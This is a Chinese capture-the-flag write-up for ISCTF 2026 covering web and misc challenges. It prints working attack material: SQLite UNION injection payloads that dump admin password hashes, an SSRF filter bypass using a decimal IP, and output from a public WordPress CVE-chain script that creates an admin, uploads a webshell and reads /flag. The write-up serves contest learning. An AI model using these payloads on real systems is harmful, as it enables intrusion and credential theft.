---
title: "ISCTF 2026 WP"
published: 2026-11-23
description: "和 mortal 师傅一起打的线上赛，做了一些 web 和 misc 。"
image: ""
tags: []
category: ""
draft: false
---
> 勉强做了些题，感觉做了挺久的，但好像回看 wp 也没有很多内容，或许很多时间都花在了头脑风暴上？
## Web

### git_leak

对下载下来的附件进行 git 操作即可得到 flag ：

```
D:\CyberSecurity\isctf2026\gitleak-attachment\.git>git ls-tree -r head
100644 blob 7f763c6cca87b6d9f8676a1d8c7766a98ca622ee    index.php

D:\CyberSecurity\isctf2026\gitleak-attachment\.git>git show 7f763c6cca87b6d9f8676a1d8c7766a98ca622ee
<?php
//flag:ISCTF{Git_136c_1s_34sy_s1gn}
echo "<h1>欢迎来到ISCTF签到页面</h1>";
echo "<p>这里什么都没有喔~</p>";
?>
```

### Break Here

访问 `/app.js` ，可以得到一段被混淆的 js 代码，交给 deepseek 分析后可以知道这是 obfuscator.io 风格的混淆方式，上网搜索得到 [Obfuscator.io Deobfuscator](https://obf-io.deobfuscate.io/) 可以用来解混淆该代码：

```js
(() => {
  'use strict';

  const _0x25ae27 = document.getElementById("status");
  const _0x20cd04 = document.getElementById("again");
  const _0x49d0a7 = {
    'sid': '',
    'enc': '',
    'txt': '',
    'ok': false
  };
  function _0x1000f1(_0x465b79) {
    let _0x108d68 = 2166136261;
    const _0xfe3b5f = _0x465b79 + ":isctf";
    for (let _0x3916b6 = 0; _0x3916b6 < _0xfe3b5f.length; _0x3916b6++) {
      _0x108d68 ^= _0xfe3b5f.charCodeAt(_0x3916b6);
      _0x108d68 = Math.imul(_0x108d68, 16777619) >>> 0;
    }
    const _0x5f1b47 = new Uint8Array(16);
    for (let _0x409338 = 0; _0x409338 < _0x5f1b47.length; _0x409338++) {
      _0x108d68 ^= _0x108d68 << 13;
      _0x108d68 >>>= 0;
      _0x108d68 ^= _0x108d68 >>> 17;
      _0x108d68 >>>= 0;
      _0x108d68 ^= _0x108d68 << 5;
      _0x108d68 >>>= 0;
      _0x5f1b47[_0x409338] = _0x108d68 & 255;
    }
    return _0x5f1b47;
  }
  function _0x4daeb8(_0x4958d8, _0x445226) {
    const _0x688da7 = atob(_0x4958d8);
    const _0x370b75 = _0x1000f1(_0x445226);
    const _0x3d79a4 = new Uint8Array(_0x688da7.length);
    for (let _0x31d42b = 0; _0x31d42b < _0x688da7.length; _0x31d42b++) {
      _0x3d79a4[_0x31d42b] = _0x688da7.charCodeAt(_0x31d42b) ^ _0x370b75[_0x31d42b % _0x370b75.length] ^ _0x31d42b * 31 + 17 & 255;
    }
    return new TextDecoder("utf-8").decode(_0x3d79a4);
  }
  async function _0x1eb8c6() {
    const _0x587c89 = await fetch("/api/runtime", {
      'cache': "no-store"
    });
    if (!_0x587c89.ok) {
      throw new Error("runtime");
    }
    return _0x587c89.json();
  }
  async function _0x45e51f() {
    try {
      _0x20cd04.disabled = true;
      _0x25ae27.textContent = "校验中…";
      const _0x510022 = await _0x1eb8c6();
      _0x49d0a7.sid = _0x510022.s;
      _0x49d0a7.enc = _0x510022.t;
      const _0x2cf7f9 = _0x4daeb8('', '');
      _0x49d0a7.txt = _0x2cf7f9;
      window.__v(_0x2cf7f9);
      _0x25ae27.textContent = "校验完成";
    } catch (_0x182aa5) {
      _0x25ae27.textContent = '校验失败';
    } finally {
      _0x20cd04.disabled = false;
    }
  }
  _0x20cd04.addEventListener("click", _0x45e51f);
  _0x45e51f();
})();
;
(function () {
  var _0x5c2e = {
    "t": '',
    "s": 0
  };
  function _0x1f7a(_0x3a9d) {
    _0x5c2e.s = _0x3a9d;
    _0x5c2e._bp7f3a9 = _0x3a9d;
    return 0;
  }
  window.__v = _0x1f7a;
  window.hint = function () {
    return 175;
  };
})();
```

发现还是好难辨认，只好再次交给 deepseek 进行可读性优化：

```
async function main() {
    const {s: sid, t: b64ct} = await (await fetch('/api/runtime', {cache:'no-store'})).json();

    let h = 0x811C9DC5;
    for (const c of sid + ':isctf') { h ^= c.codePointAt(); h = Math.imul(h, 16777619) >>> 0; }

    const key = new Uint8Array(16);
    for (let i = 0; i < 16; i++) {
        h ^= h << 13; h >>>= 0;
        h ^= h >>> 17;
        h ^= h << 5;  h >>>= 0;
        key[i] = h & 0xFF;
    }

    const ct = atob(b64ct), out = new Uint8Array(ct.length);
    for (let i = 0; i < ct.length; i++)
        out[i] = ct.charCodeAt(i) ^ key[i % 16] ^ ((i * 31 + 17) & 0xFF);

    const txt = new TextDecoder('utf-8').decode(out);
    window.__v(txt);
}
```

根据加密方法进行 python 获取相关内容进行本地反解即可：

```python
import base64, json, sys, requests

URL = "http://110.42.47.164:32015/api/runtime"
j = requests.get(URL, headers={"Cache-Control":"no-store"}, timeout=15).json()
sid, ct = j["s"], base64.b64decode(j["t"])

h = 0x811C9DC5
for ch in (sid + ":isctf").encode():
    h ^= ch; h = (h * 16777619) & 0xFFFFFFFF

key = bytearray()
for _ in range(16):
    h ^= (h << 13) & 0xFFFFFFFF
    h ^= h >> 17
    h ^= (h << 5) & 0xFFFFFFFF
    key.append(h & 0xFF)

out = bytes(c ^ key[i % 16] ^ ((i * 31 + 17) & 0xFF) for i, c in enumerate(ct))
print(out.decode("utf-8", "replace"))
```

得到 flag ：

```
ISCTF{6fd9ee7176766d6453a8be6706494a2c}
```

### 账单导出哈

注册账号后可以看到主界面有导出账单功能，点击后发现虽然该账户没有账单，但是还是出现了一个导出记录：

```json
{
  "context": "b3JkZXI6MDhlMGFhM2ItMzI5Ny00OTg0LWIxMTUtNjMxYjdhN2YxMjQy",
  "generated_at": "2026-11-14 04:20:15",
  "order_count": 0,
  "range": {},
  "total_amount": 0,
  "user": "qwe"
}
```

其中的 `context` 给出的内容解码后是 `order:08e0aa3b-3297-4984-b115-631b7a7f1242` 像是一条 UUID ，由于导出的接口是 
`/api/export` ， 猜测到 `/api/order` 这一接口，那么 UUID 要么是子路径要么就是查询参数，最终发现 `/api/order/08e0aa3b-3297-4984-b115-631b7a7f1242` 返回以下内容：

```json
{
  "amount": 999.99,
  "created_at": "2026-01-10 10:35:00",
  "order_id": "08e0aa3b-3297-4984-b115-631b7a7f1242",
  "receipt_ref": "http://127.0.0.1:8081/receipt/d54ba989-73ce-474c-948c-7e8161d53ad8",
  "remark": "*** 该内容需在渲染服务中查看 ***",
  "status": "archived",
  "title": "企业专属账单归档"
}
```

此处出现了一个字段 —— `"receipt_ref": "http://127.0.0.1:8081/receipt/d54ba989-73ce-474c-948c-7e8161d53ad8"` ，考虑是否有 SSRF 漏洞可以利用。注意到导出功能有一个云端同步功能，尝试输入 `file:///flag` ，返回：

```json
{
  "context": "b3JkZXI6MDhlMGFhM2ItMzI5Ny00OTg0LWIxMTUtNjMxYjdhN2YxMjQy",
  "generated_at": "2026-11-14 04:27:31",
  "mirror_result": {
    "error": "only http/https targets are supported"
  },
  "order_count": 0,
  "range": {},
  "total_amount": 0,
  "user": "qwe"
}
```

尝试输入 `http://127.0.0.1:8080/` ，返回（省略其他信息）：

```json
"mirror_result": {
    "error": "target address is not allowed"
},
```

尝试进行十进制绕过 `http://2130706433:8080/` ：

![ISCTF 2026 WP](/assets/images/posts/isctf-2026-wp/01-isctf-2026-wp.png)

成功绕过基于朴素匹配的安全策略，尝试进行云端同步 `http://2130706433:8081/receipt/d54ba989-73ce-474c-948c-7e8161d53ad8` ：

```json
"mirror_result": {
    "body": "{\"amount\":999.99,\"created_at\":\"2026-01-10 10:35:00\",\"order_id\":\"08e0aa3b-3297-4984-b115-631b7a7f1242\",\"remark\":\"ISCTF{8596dbb0b716fc1cd0fdd2d534a98510}\",\"status\":\"archived\",\"title\":\"企业专属账单归档\"}\n",
    "status": 200
  },
```

得到 flag 。

### 王的体检报告

根据提示，访问 `robots.txt` ：

```plain
User-agent: *
Disallow: /api/healthcheck
Disallow: /vip-daycare

# 乌托邦·王：外包说 robots.txt 是给搜索引擎看的，没人会来这里翻。
# --- 赛事筹备组备注（2026-11-02）---
# 体检接口只给内部扫描器用，千万别用浏览器直接访问（会 405）。
# 内网入口页同理，别让选手乱点。
```

直接使用 GET 访问发现 `405 Method Not Allowed` ，换用 POST 访问，发现 `403 Forbidden` ，提示要检查 UA 头。根据提示，到 `/vip-daycare` 处找到体检工具名称 `UtopiaHealthScanner` ，填入 UA 头。而后仍然 `403` ，发现要检查 `Referer` ，访问 `/vip-daycare` 发现 `Referer` 就是要填该路径，最终成功获得一次性取件凭证与取件地址：

![ISCTF 2026 WP-1](/assets/images/posts/isctf-2026-wp/02-isctf-2026-wp-1.png)

设置 cookie 后用 GET 方法访问路径 `/vip-daycare/preview/vip-daycare-preview-3c9d04`（这里真是头脑风暴了非常之久，就连 agent 也连连摇头），得到最终的 flag 。

![ISCTF 2026 WP-2](/assets/images/posts/isctf-2026-wp/03-isctf-2026-wp-2.png)

### LitePress

观察界面，发现有一个界面是接口文档泄露了已有的接口，打开观看，发现其中有一个搜索接口 `/lp-json/lp/v2/search?q=` ，尝试传入 `c` ，回显第四篇文章：

```json
[
  {
    "id": "4",
    "title": "SQLite 在小型 CMS 中的应用"
  }
]
```

尝试传入 `c'` ，发现报出错误：

```plain
<br />
<b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[HY000]: General error: 1 unrecognized token: &quot;'&quot; in /app/src/db/Database.php:32
Stack trace:
#0 /app/src/db/Database.php(32): PDO-&gt;query('SELECT id, titl...')
#1 /app/src/handlers/QueryHandler.php(17): C5-&gt;query('SELECT id, titl...')
#2 /app/src/core/Dispatcher.php(47): C10::m3(Object(C11))
#3 /app/src/index.php(110): C6::dispatch(Object(C11), Array, NULL)
#4 {main}
  thrown in <b>/app/src/db/Database.php</b> on line <b>32</b><br />
```

则存在字符型 SQL 注入，由 `unrecognized token` 的表述，初步推测后端是 sqlite 。为了让结果更容易辨识，将单引号前载荷换成一个所有文章中未出现的字符 `1` 进行列数爆破，最终发现 `/lp-json/lp/v2/search?q=1' union select 1,2-- -` 不会报错，则列数为 2 。

接下来尝试进行联合注入 `/lp-json/lp/v2/search?q=1' union select 1,(select group_concat(name) from sqlite_master where type='table')-- -` ，但是出现了一个奇怪的报错：

```plain
<br />
<b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[HY000]: General error: 1 unrecognized token: &quot;\&quot; in /app/src/db/Database.php:32
Stack trace:
#0 /app/src/db/Database.php(32): PDO-&gt;query('SELECT id, titl...')
#1 /app/src/handlers/QueryHandler.php(17): C5-&gt;query('SELECT id, titl...')
#2 /app/src/core/Dispatcher.php(47): C10::m3(Object(C11))
#3 /app/src/index.php(110): C6::dispatch(Object(C11), Array, NULL)
#4 {main}
  thrown in <b>/app/src/db/Database.php</b> on line <b>32</b><br />
```

可以看到报出来的错误集中在一个反斜杠上 `&quot;\&quot;` ，但是我们的 payload 本身并没有反斜杠啊。经过与 AI 的促膝长谈终于发现了本题的奇特的知识点 —— `addslashes`（由于官方仓库还未出来，仅作猜想）。

首先由接口文档里的说明可以知道 —— 标题 / 正文关键词检索，关键词经转义后参与匹配 ——也就是说我们的查询参数经过了转义。而对于 PHP ，有一个老牌的转义函数 `addslashes` ，可以把 `'` `"` `\` `NUL` 转义为 `\'` `\"` `\\` `\0` 四种，但是有个关键漏洞，就是这套反斜杠转义是仅仅针对 mysql 的，sqlite 里根本不支持这种转义方式。所以导致 payload 如 `a''` 在拼接后变成了 `LIKE '%a\'\'%'` ，`'%a\'` 构成一个完整字符串，后面的 `\` 不在字符串内也不是有效符号，便导致了解析错误。

解决方法就是不用 `where` 等会用到单引号的查询过滤方式，转用纯数字的方式进行过滤，可以想到的方式是 `LIMIT` 和 `OFFSET` 的组合。

```sql
1' union select 1,(select name from sqlite_master limit 1 offset 0)-- -
1' union select 1,(select name from sqlite_master limit 1 offset 1)-- -
1' union select 1,(select name from sqlite_master limit 1 offset 2)-- -
1' union select 1,(select name from sqlite_master limit 1 offset 3)-- -
```

由此可以得到四个表名 `posts` `comments` `tags` `admins` ，重点应该在 `admins` ，由于无法使用字符串，改为查询建表语句 `/lp-json/lp/v2/search?q=1' union select 1,(select sql from sqlite_master limit 1 offset 3)-- -` ：

```json
[
  {
    "id": "1",
    "title": "CREATE TABLE admins (id INTEGER PRIMARY KEY, user_login TEXT NOT NULL, user_pass TEXT NOT NULL)"
  }
]
```

取出对应的账号、密码 `/lp-json/lp/v2/search?q=1' union select 1,(select group_concat(user_login||char(58)||user_pass) from admins)-- -` ：

```json
[
  {
    "id": "1",
    "title": "adm_c4d28e:$2y$10$urVP9cC3nAk/DK9JgcquJe253dyuL1.90VB1Gs3Q4iGjnCn6/i0ze"
  }
]
```

拿到凭据后先尝试访问 `/lp-json/lp/v2/admin/options` ，返回内容：

```json
{"code":"rest_forbidden","message":"Sorry, you are not allowed to do that."}
```

这里尝试了在 `Authorization` 、`cookie` 等方案，无果。使用 agent 进行辅助扫描各种请求头，最终发现 `X-LP-Token: adm_c4d28e` 可以通过校验，最终得到 flag ：

```
{
  "site": "LitePress",
  "version": "1.4.2",
  "flag": "ISCTF{679ae90ffaa2d5bc4bac008a4aa6cbd3}"
}
```

### 简单网站搭建

简单测试了首页的搜索文章功能，未发现存在 sql 注入。查看源码，发现了该网站所使用的框架和版本号：

```html
<meta name="generator" content="WordPress 6.9.4" />
```

上网查询相关的 CVE 漏洞，发现了一个组合漏洞 `CVE-2026-60137 && CVE-2026-63030` ，其受影响版本在 WordPress 6.9.x 与 7.0.x 的区间内，符合该网站采用的 WordPress 的版本。该漏洞链的最终执行成果是 RCE ，具体利用链如下。

> 攻击者利用 `CVE-2026-63030` 的 `batch` 路由混淆绕过 REST 鉴权与参数校验边界，将恶意参数注入子请求，触发 `CVE-2026-60137` 的 SQL 注入；通过 SQL 注入直接在 `wp_users` 表插入一个临时管理员账号，随后用该账号登录后台获取管理员 Cookie，再调用 WordPress 原生插件上传接口上传恶意 PHP 插件，最终访问插件文件执行系统命令，完成 RCE。

该漏洞的前提是 REST API 的 `batch/v1` 端点开放，访问 `/wp-json/` 返回有效内容，证明 REST API 开放，尝试 POST `/wp-json/batch/v1` ，返回以下内容：

```json
{
  "code": "rest_missing_callback_param",
  "message": "Missing parameter(s): requests",
  "data": {
    "status": 400,
    "params": [
      "requests"
    ]
  }
}
```

证明该端点确实开启。在 Github 上查到相关 POC 脚本 [wp2shell-poc](https://github.com/l-i-uqing/CVE-2026-63030-wp2shell-repro) ，git pull 到本地后使用以下命令完成两个 CVE 分别的检查：

```bash
python3 wp2shell.py check http://110.42.47.164:32038/ --confirm-sqli
```

二者都 detected 的标志是：

```plain
[+] VULNERABLE — batch route-confusion behavior detected.
[+] SQLi confirmed — UNION fake-post read returned data.
```

而后开始利用脚本构造 RCE ，在 `/flag` 下发现 flag 。

```bash
$ python3 wp2shell.py shell http://110.42.47.164:32038/ --cmd "cat /flag" --timeout 90
[!] This uploads a plugin containing a webshell to the target.
[!] No credentials supplied; attempting pre-auth administrator creation.
[*] Creating administrator through the SQLi-to-customizer bridge...
[+] Administrator created: wp2_52f70c3ad7f9
[+]     email:    wp2_52f70c3ad7f9@wp2shell.invalid
[+]     password: Wp2!chTkFp6bhZHXYOrCx8Fm
[*] Authenticating as 'wp2_52f70c3ad7f9'...
[+] Authenticated.
[*] Deploying webshell plugin...
[+] Webshell: http://110.42.47.164:32038/wp-content/plugins/wp2shell_9a12a531/wp2shell_9a12a531.php

ISCTF{649c06da49855f88e3d46f9edc617744}

[*] Deleting generated administrator...
[+] Generated administrator removed from the target.
[*] Cleaning up webshell...
[+] Webshell removed from the target.
```

需要注意的是由于在内部回环的过程中服务器资源被严重占用较长时间，期间脚本进行的请求很容易被 timeout ，所以对于这里的 POC 脚本，参数里的 `--timeout` 要设置为一个较大的数字给服务器缓和的时间，否则会出现以下错误：

```plain
[!] This uploads a plugin containing a webshell to the target.
[!] No credentials supplied; attempting pre-auth administrator creation.
[*] Creating administrator through the SQLi-to-customizer bridge...
[+] Administrator created: wp2_58b815dc848c
[+]     email:    wp2_58b815dc848c@wp2shell.invalid
[+]     password: Wp2!THF3VS5heHyML6sSNY_s
[*] Authenticating as 'wp2_58b815dc848c'...
[+] Authenticated.
[*] Deploying webshell plugin...
[-] cannot reach http://110.42.47.164:32038: timed out
```

## misc

### 学科大杂烩

下载的压缩包存在伪加密，用随波逐流工具解开伪加密，得到一个图片一个文本。

文本内容是社会主义核心价值观加密，解密后得到以下内容：

```plain
TGPNPNTPPNNNTNTTGNNNPTGPNPNTGNNNPTNTTGPNPNTGPNPNGNPNPNPGNPNTPGNNPPTNTTGNNNPGNPNPNTGNNNPGNPNPNPTGNNNTGNNNPPGNNNGTGNNNPPGNNNGGNPNPNPGTPNTTNTTPGNGTTGNNNPTGNNGPTGNNNPPGNNNGTGNNNPTGNNGPTGNNNPGNPNPNPGNPNTPGGNGN
```

进行 `rot13` 解密，可以看出有点像 DNA 加密，但是常规加密表无法得到有效信息：

```plain
GTCACAGCCAAAGAGGTAAACGTCACAGTAAACGAGGTCACAGTCACATACACACTACAGCTAACCGAGGTAAACTACACAGTAAACTACACACGTAAAGTAAACCTAAATGTAAACCTAAATTACACACTGCAGGAGGCTATGGTAAACGTAATCGTAAACCTAAATGTAAACGTAATCGTAAACTACACACTACAGCTTATA
```

对小蓝鲨图片进行分析，在随波逐流中以文本方式读取后在结尾发现了一张课程表与密码表：

```plain
+----+---------+-----------------------------+
| No | Time    | Subject                     |
+----+---------+-----------------------------+
| 1  | 08:00   | Politics  (ZhengZhi)        |
| 2  | 09:00   | History   (LiShi)           |
| 3  | 10:00   | Biology   (ShengWu)         |
| 4  | 14:00   | Chemistry (HuaXue)          |
| 5  | 15:00   | Math      (ShuXue)          |
+----+---------+-----------------------------+
```

```plain
Biology Handout - DNA CODE
Codon Character | Codon Character | Codon Character | Codon Character
AAA a | CAA q | GAA G | TAA W
AAC b | CAC r | GAC H | TAC X
AAG c | CAG s | GAG I | TAG Y
AAT d | CAT t | GAT J | TAT Z
ACA e | CCA u | GCA K | TCA 1
ACC f | CCC v | GCC L | TCC 2
ACG g | CCG w | GCG M | TCG 3
ACT h | CCT x | GCT N | TCT 4
AGA i | CGA y | GGA O | TGA 5
AGC j | CGC z | GGC P | TGC 6
AGG k | CGG A | GGG Q | TGG 7
AGT l | CGT B | GGT R | TGT 8
ATA m | CTA C | GTA S | TTA 9
ATC n | CTC D | GTC T | TTC 0
ATG o | CTG E | GTG U | TTG (space)
ATT p | CTT F | GTT V | TTT .
```

按照此规则进行解码：

```
TeLaISbTeSbITeTeXeCsCfISbXeSbXeBaSbCdSbCdXeEsINoSbSnSbCdSbSnSbXeCsFm
```

由课程表可以知道接下来是化学，按照每个元素的原子序数进行解码：

```plain
52 57 53 51 52 51 53 52 52 54 55 98 53 51 54 51 54 56 51 48 51 48 54 99 53 102 51 50 51 48 51 50 51 54 55 100
```

将数字映射为 ascii 码：

```plain
49534354467b53636830306c5f323032367d
```

16 进制转 ascii 码：

```
ISCTF{Sch00l_2026}
```


### 海报泄露

解压后对 `poster_10.png` 文件进行 `binwalk` 检测：

![ISCTF 2026 WP-3](/assets/images/posts/isctf-2026-wp/04-isctf-2026-wp-3.webp)

然后使用 `foremost` 提取出一个 `zip` ，对其进行伪加密修复，里面的 `flag.png` 即为 flag 。

![ISCTF 2026 WP-4](/assets/images/posts/isctf-2026-wp/05-isctf-2026-wp-4.png)

### 我是克劳德？

给出的附件中有一个很重要的信息：

```json
{"role": "assistant", "content": "19923, 14, 11014, 16, 455, 1926, 3676, 4230, 22651, 4374, 1465, 14, 554, 61932, 16, 5592, 344, 782, 14364, 28, 4756, 5272, 40, 39296, 18, 77, 21, 80, 19, 92, 21, 84, 20627, 21, 88, 21, 84, 17239, 907, 85, 65, 939, 24, 95"}
```

可以判断这个是某家模型的 tokenid ，尝试使用不同模型的词表对其进行解码，最终得到该模型是 `deepseek-v3` ，通过 [dsv3-tokenizer.json](https://hf-mirror.com/deepseek-ai/DeepSeek-V3/resolve/main/tokenizer.json) 下载词表文件，然后用 nodejs 运行以下代码：

```js
const fs = require('fs');

const IDS = [19923, 14, 11014, 16, 455, 1926, 3676, 4230, 22651, 4374, 1465, 14,
             554, 61932, 16, 5592, 344, 782, 14364, 28, 4756, 5272, 40, 39296, 18,
             77, 21, 80, 19, 92, 21, 84, 20627, 21, 88, 21, 84, 17239, 907, 85,
             65, 939, 24, 95];

// 读取词表并反转:id -> token
const tokJson = JSON.parse(fs.readFileSync(__dirname + '/dsv3-tokenizer.json', 'utf8'));
const id2tok = {};
for (const [tok, id] of Object.entries(tokJson.model.vocab)) id2tok[id] = tok;
for (const t of tokJson.added_tokens) id2tok[t.id] = t.content;   // special tokens 优先

// 拼接 token(字节级 BPE 词表里空格写作 Ġ、换行写作 Ċ)
const raw = IDS.map(i => id2tok[i]).join('');

// GPT-2 bytes_to_unicode 逆变换:字符 -> 原字节,再按 UTF-8 还原文本
function bytesToUnicode() {
  const cs = [];
  let n = 0;
  for (let b = 0; b < 256; b++) {
    if ((b >= 33 && b <= 126) || (b >= 161 && b <= 172) || (b >= 174 && b <= 255)) cs[b] = b;
    else { cs[b] = 256 + n; n++; }
  }
  return cs;                       // 字节 -> 码点
}
const U2B = {};
for (let b = 0; b < 256; b++) U2B[bytesToUnicode()[b]] = b;   // 码点 -> 字节

const bytes = [];
for (const ch of raw) {
  const cp = ch.codePointAt(0);
  if (cp in U2B) bytes.push(U2B[cp]);                            // 映射表内:查回字节
  else for (const b of Buffer.from(ch, 'utf8')) bytes.push(b);  // 表外(如中文)原样
}
console.log(Buffer.from(bytes).toString('utf8'));
```

即可得到这段信息的内容：

```plain
Hello, agent. The call record says DeepSeek, not Claude. Here is your flag: ISCTF{T0k3n1z3r_N3v3r_L13s_2026}
```
